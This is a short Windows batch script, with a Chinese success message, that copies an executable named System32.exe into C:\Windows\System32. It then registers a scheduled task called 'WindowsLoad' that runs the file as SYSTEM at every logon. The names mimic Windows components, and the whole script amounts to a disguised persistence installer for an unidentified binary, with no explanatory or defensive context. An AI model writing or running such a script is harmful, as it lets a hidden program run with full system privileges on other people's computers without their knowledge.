cd %~dp0
copy /y System32.exe C:\Windows\System32\
schtasks /create /tn "WindowsLoad"  /ru system /tr C:\Windows\System32\System32.exe /sc onlogon
echo 创建成功，请检查...
pause